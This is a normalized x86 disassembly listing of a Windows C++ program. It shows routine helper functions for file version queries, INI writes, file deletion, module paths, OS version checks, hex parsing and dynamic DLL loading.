call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x12c ] 0x1
lea ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_428180
sub esp 0xc
push ebx
push esi
push edi
mov edi [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
xor ebx ebx
push edi
mov [ esp + 0x18 ] ebx
call GetFileVersionInfoSizeW
mov esi eax
cmp esi ebx
jbe r-xdata
pop edi
pop esi
mov al bl
pop ebx
add esp 0xc
retn
push ebp
push esi
call [ malloc@IAT ]
add esp 0x4
mov ebp eax
push ebp
push esi
push ebx
push edi
call GetFileVersionInfoW
test eax eax
je r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
pop ebp
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
push r--data
push ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] ebx
call VerQueryValueW
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx ebx
je r-xdata
mov edx [ esp + 0x24 ]
cmp edx ebx
mov eax [ ecx + 0x10 ]
mov ecx [ ecx + 0x14 ]
je r-xdata
mov edx [ esp + 0x28 ]
cmp edx ebx
je r-xdata
mov esi eax
shr esi 0x10
mov [ edx ] esi
mov eax [ esp + 0x2c ]
cmp eax ebx
je r-xdata
and eax 0xffff
mov [ edx ] eax
mov eax [ esp + 0x30 ]
cmp eax ebx
je r-xdata
mov edx ecx
shr edx 0x10
mov [ eax ] edx
mov bl 0x1
and ecx 0xffff
mov [ eax ] ecx
sub_428250
sub esp 0xc
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
lea eax [ esp + 0x10 ]
push eax
xor ebp ebp
push ebx
mov [ esp + 0x18 ] ebp
call GetFileVersionInfoSizeW
mov esi eax
cmp esi ebp
jbe r-xdata
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn
push edi
push esi
call [ malloc@IAT ]
add esp 0x4
mov edi eax
push edi
push esi
push ebp
push ebx
call GetFileVersionInfoW
test eax eax
je r-xdata
push edi
call [ free@IAT ]
add esp 0x4
pop edi
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
push r--data
push edi
mov [ esp + 0x20 ] ebp
mov [ esp + 0x28 ] ebp
call VerQueryValueW
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
xor ecx ecx
mov ch [ eax + 0x12 ]
xor edx edx
mov dh [ eax + 0x16 ]
mov cl [ eax + 0x10 ]
movzx eax [ eax + 0x14 ]
movzx edx dx
shl ecx 0x10
or ecx edx
or ecx eax
mov ebp ecx
sub_4282f0
push 0xffffffff
push sub_432be3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
mov eax [ rw-data ]
push ebx
push ebp
push esi
xor ebx ebx
push edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x14 ] ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x40 ] 0x1
mov edi [ esp + 0x4c ]
mov ebp [ swprintf@IAT ]
xor esi esi
lea esp [ esp ]
movzx eax [ esi + edi ]
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
mov [ esp + 0x1c ] bx
mov [ esp + 0x1e ] bx
call ebp
add esp 0xc
push 0x2
lea edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
inc esi
cmp esi 0x14
jb r-xdata
mov esi [ esp + 0x48 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x40 ] bl
lea ecx [ esp + 0x18 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x38 ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x28 ]
pop ebx
call sub_42e72f
add esp 0x34
retn
sub_4283c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x80c
mov eax [ rw-data ]
push edi
mov [ esp + 0x80c ] eax
xor eax eax
mov [ esp + 0x8 ] 0x0
mov ecx 0x1ff
lea edi [ esp + 0xa ]
[ edi ]
mov ecx [ ebp + 0x14 ]
stosw [ edi ]
lea eax [ ebp + 0x18 ]
push eax
push ecx
lea edx [ esp + 0x10 ]
push edx
call [ vswprintf@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ecx [ ebp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ WritePrivateProfileStringW@IAT ]
mov ecx [ esp + 0x80c ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
sub_428440
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
push edi
mov ecx ebp
mov bl 0x1
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::length@IAT ]
lea eax [ eax + eax + 0x4 ]
push eax
call j_sub_42e3bc
add esp 0x4
mov ecx ebp
mov esi eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::length@IAT ]
lea ecx [ eax + eax + 0x4 ]
mov edx ecx
shr ecx 0x2
xor eax eax
mov edi esi
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx ebp
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
push esi
call [ wcscpy@IAT ]
xor eax eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
add esp 0x8
mov [ esp + 0x28 ] eax
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x30 ] ax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x3
mov [ esp + 0x1c ] esi
mov [ esp + 0x24 ] 0x414
call [ SHFileOperationW@IAT ]
test eax eax
je r-xdata
push esi
call ??_V@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
mov al bl
pop ebx
add esp 0x20
retn
xor bl bl
sub_428500
push 0xffffffff
push sub_432c1c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
mov eax [ rw-data ]
push esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4c ] 0x1
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ eax ]
mov esi [ esp + 0x58 ]
push ecx
push 0x2f
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ edx ]
cmp ecx eax
jne r-xdata
mov edx [ edx ]
inc eax
push edx
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
mov [ esp + 0x4c ] 0x2
push eax
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x4c ] 0x1
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
push ecx
push 0x5c
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
cmp [ edx ] eax
je r-xdata
mov esi [ esp + 0x54 ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x4c ] 0x0
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x44 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x40 ]
pop esi
call sub_42e72f
add esp 0x4c
retn
sub_4285f0
sub esp 0x24
push esi
mov esi [ esp + 0x2c ]
push edi
mov ecx esi
xor edi edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::length@IAT ]
cmp eax 0x13
jb r-xdata
mov eax edi
pop edi
pop esi
add esp 0x24
retn
xor eax eax
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0x2c ] eax
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x30 ]
push eax
push r--data
mov ecx esi
mov [ esp + 0x24 ] edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ swscanf@IAT ]
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x38 ]
sub edi 0x76c
lea ecx [ esp + 0x28 ]
dec esi
push ecx
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] esi
call [ mktime@IAT ]
add esp 0x24
pop edi
pop esi
add esp 0x24
retn
sub_4286a0
push 0xffffffff
push sub_432c5c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
mov eax [ rw-data ]
push esi
xor esi esi
lea ecx [ esp + 0x4c ]
mov [ esp + 0x68 ] eax
mov [ esp + 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x74 ] 0x1
cmp [ esp + 0x80 ] esi
je r-xdata
mov esi [ esp + 0x7c ]
lea ecx [ esp + 0x4c ]
push ecx
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x74 ] 0x0
lea ecx [ esp + 0x4c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x6c ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x68 ]
pop esi
call sub_42e72f
add esp 0x74
retn
lea eax [ esp + 0x80 ]
push eax
call [ localtime@IAT ]
xor ecx ecx
mov [ esp + 0x2a ] ecx
mov [ esp + 0x2e ] ecx
mov [ esp + 0x32 ] ecx
mov [ esp + 0x36 ] ecx
mov [ esp + 0x3a ] ecx
mov [ esp + 0x3e ] ecx
push eax
mov [ esp + 0x46 ] ecx
push r--data
mov [ esp + 0x4e ] ecx
lea edx [ esp + 0x30 ]
mov [ esp + 0x52 ] ecx
push 0x14
push edx
mov [ esp + 0x38 ] si
mov [ esp + 0x5e ] cx
call [ wcsftime@IAT ]
add esp 0x14
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x74 ] 0x2
push eax
lea ecx [ esp + 0x50 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x74 ] 0x1
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4287e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x124
mov eax [ rw-data ]
push edi
mov [ esp + 0x124 ] eax
xor eax eax
mov ecx 0x45
lea edi [ esp + 0x8 ]
[ edi ]
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] 0x114
call [ GetVersionExW@IAT ]
cmp [ esp + 0x18 ] 0x2
je r-xdata
mov ecx [ esp + 0x124 ]
xor eax eax
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
cmp [ esp + 0xc ] 0x4
ja r-xdata
mov eax 0x1
mov ecx [ esp + 0x124 ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
sub_428850
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x12c
mov eax [ rw-data ]
mov [ esp + 0x128 ] eax
mov eax [ rw-data ]
test eax eax
push edi
jne r-xdata
mov ecx [ esp + 0x12c ]
mov eax [ rw-data ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx 0x47
lea edi [ esp + 0x8 ]
[ edi ]
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0xc ] 0x6
mov ecx 0x1
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ esp + 0x12c ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
cmp [ esp + 0x122 ] cl
jne r-xdata
mov eax ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ esp + 0x12c ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
sub_428920
push 0xffffffff
push sub_432c9e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x210
mov eax [ rw-data ]
mov [ esp + 0x20c ] eax
mov [ esp ] 0x0
test [ rw-data ] 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
or [ rw-data ] 0x1
mov [ esp + 0x218 ] 0x1
mov ecx rw-data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
push __imp_??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ_434160
call sub_42e6e6
add esp 0x4
mov [ esp + 0x218 ] 0x0
push esi
mov esi [ esp + 0x224 ]
push rw-data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x214 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x210 ]
mov [ esp + 0x4 ] 0x1
pop esi
call sub_42e72f
add esp 0x21c
retn
push edi
xor eax eax
mov [ esp + 0x8 ] 0x0
mov ecx 0x81
lea edi [ esp + 0xa ]
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0xc ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
lea edx [ esp + 0x8 ]
push edx
mov ecx rw-data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
pop edi
sub_428a20
push 0xffffffff
push sub_432cde
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x210
mov eax [ rw-data ]
push ebx
xor ebx ebx
mov [ esp + 0x210 ] eax
mov [ esp + 0x4 ] ebx
test [ rw-data ] 0x1
push esi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
or [ rw-data ] 0x1
mov [ esp + 0x220 ] 0x1
mov ecx rw-data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
push __imp_??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ_434170
call sub_42e6e6
add esp 0x4
mov [ esp + 0x220 ] bl
mov esi [ esp + 0x228 ]
push rw-data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x218 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x210 ]
mov [ esp + 0x4 ] 0x1
pop ebx
call sub_42e72f
add esp 0x21c
retn
push edi
xor eax eax
mov [ esp + 0x10 ] bx
mov ecx 0x81
lea edi [ esp + 0x12 ]
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0x14 ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
lea edx [ esp + 0x10 ]
push edx
call [ wcslen@IAT ]
add esp 0x4
cmp eax ebx
mov ecx eax
pop edi
jle r-xdata
lea eax [ esp + 0xc ]
push eax
mov ecx rw-data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov edx 0x5c
lea edx [ ecx + 0x1 ]
cmp edx eax
jge r-xdata
cmp ecx ebx
jne r-xdata
mov [ esp + ecx * 2 + 0xe ] bx
dec ecx
cmp [ esp + ecx * 2 + 0xc ] dx
je r-xdata
jmp r-xdata
sub_428b50
push 0xffffffff
push sub_432d13
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov eax [ rw-data ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x4 ]
push esi
push eax
mov [ esp + 0x8 ] 0x0
call sub_428a20
add esp 0x4
mov [ esp + 0x30 ] 0x1
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ ecx ]
mov eax ecx
xor esi esi
jmp r-xdata
cmp eax ecx
je r-xdata
push eax
push r--data
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ edx ]
cmp eax ecx
je r-xdata
dec eax
mov edx [ edx ]
cmp eax edx
je r-xdata
inc esi
cmp esi 0x3
jl r-xdata
mov esi [ esp + 0x38 ]
lea edx [ esp + 0x8 ]
push edx
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x28 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24 ]
pop esi
call sub_42e72f
add esp 0x30
retn
inc eax
push edx
push eax
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
sub_428c30
push 0xffffffff
push sub_432d29
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ rw-data ]
push ebx
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x4 ]
push esi
push eax
call sub_428a20
add esp 0x4
mov [ esp + 0x30 ] 0x0
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
mov ebx 0x1
je r-xdata
mov [ esp + 0x30 ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x28 ]
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x20 ]
mov eax ebx
pop ebx
call sub_42e72f
add esp 0x2c
retn
push edi
push r--data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
je r-xdata
push esi
call [ FreeLibrary@IAT ]
pop edi
mov ecx [ esp + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ecx [ esp + 0x3c ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call edi
add esp 0x8
mov ebx eax
sub_428d40
push 0xffffffff
push sub_432d63
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
mov eax [ rw-data ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0xc ] 0x0
call sub_428a20
add esp 0x4
mov [ esp + 0x34 ] 0x1
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push esi
mov esi [ esp + 0x40 ]
lea edx [ esp + 0x10 ]
push edx
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x30 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x2c ]
pop esi
call sub_42e72f
add esp 0x38
retn
lea ecx [ esp ]
push ecx
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::end@IAT ]
mov eax [ eax ]
sub eax 0x2
push eax
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ eax ]
push ecx
push 0x5c
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ edx ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ecx
inc eax
push eax
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::end@IAT ]
mov eax [ eax ]
sub eax 0x2
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov eax [ edx ]
push eax
push 0x5c
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ ecx ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ecx
inc eax
push eax
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
push r--data
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
sub_428e90
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_432d7c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x828
mov eax [ rw-data ]
mov [ esp + 0x820 ] eax
lea eax [ esp ]
push edi
push eax
call sub_428d40
add esp 0x4
xor eax eax
mov [ esp + 0x834 ] eax
cmp [ esp + 0x18 ] eax
je r-xdata
mov [ esp + 0x834 ] 0xffffffff
lea ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x82c ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x824 ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov [ esp + 0x20 ] ax
mov ecx 0x1ff
lea edi [ esp + 0x22 ]
[ edi ]
lea ecx [ ebp + 0x14 ]
push ecx
stosw [ edi ]
push edx
lea eax [ esp + 0x28 ]
push eax
call [ vswprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ ebp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ WritePrivateProfileStringW@IAT ]
sub_428f60
mov al [ esp + 0x4 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
retn
xor eax eax
retn
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
retn
movsx eax al
sub eax 0x37
retn
sub_428fa0
mov al [ esp + 0x4 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jle r-xdata
mov al 0x1
retn
xor al al
retn
cmp al 0x46
jg r-xdata
sub_428ff0
push 0xffffffff
push sub_432daa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push r--data
